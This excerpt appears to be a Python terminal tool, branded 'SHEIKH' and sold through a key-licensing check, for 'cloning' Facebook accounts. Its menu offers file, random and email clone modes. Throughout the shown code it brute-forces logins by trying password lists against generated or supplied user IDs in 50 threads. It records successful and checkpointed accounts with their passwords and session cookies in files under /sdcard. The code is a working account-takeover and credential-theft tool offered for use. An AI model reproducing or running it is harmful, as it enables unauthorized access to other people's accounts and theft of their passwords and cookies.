...
#os.system("xdg-open https://www.facebook.com/SHEIKHsheikh.420/")
...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[SHEIKH-XD')
...
╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝        
 ...
 \033[1;91m\033[1;41m\033[1;97m              WELCOME TO Sheikh  TOOLS               \033[;0m\033[1;91m\033[1;92m           

\033[1;32m---------------------------------------------------------
\033[1;32m  AUTHOR    : Sheikh 
\033[1;32m  GITHUB    : Khorsed12 
\033[1;32m  FACEBOOK  : Khorsed Sheikh 
...
#SHEIKH_NAME=input(f'\033[1;92m[\033[1;31m\033[1;92m]\033[0;92m YOUR NAME :\x1b[1;96m ')
#--------------------[ BAGIAN-MASUK ]--------------#
...
def menu():
	...
	_SHEIKH_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	_SHEIKH_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	_SHEIKH_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	_SHEIKH_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
	_SHEIKH_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____SHEIKH_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____SHEIKH_____ in ['1']:
		C1()
	if _____SHEIKH_____ in ['2']:
		Y2()
	if _____SHEIKH_____ in ['3']:
		BER()
	if _____SHEIKH_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/SHEIKHsheikh.420")
...
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(SHEIKH_NAME))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [SHEIKH] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mSHEIKH-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				#open('/sdcard/'+SHEIKH-file clone,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				#print ()
				print(f'\r\x1b[1;92m [\033[1;92mSHEIKH-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				#print('\r\x1b[1;96m [\033[1;93mCOOKIES\033[1;96m]\033[1;91m= \033[1;97m '+kuki+'')
				cek_apk(session,coki)
				open('/sdcard/SHEIKH-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as SHEIKH:
        clear()
        tl = str(len(user))      
        ...
        for love in user:
            ...
            uid = code+love
            SHEIKH.submit(SHEIKH,uid,pwv,tl)
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mSHEIKH-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/SHEIKH-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	   # print('\033[1;96m[SHEIKH.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/SHEIKH-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        ...
        sys.stdout.write('\r%s[SHEIKH-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/message/J5NBZXOPOHGYP1?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20SHEIKH%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://github.com/Khorsed12/FILE-CLONING/blob/main/Approvel%20key').text
    if key1 in r:
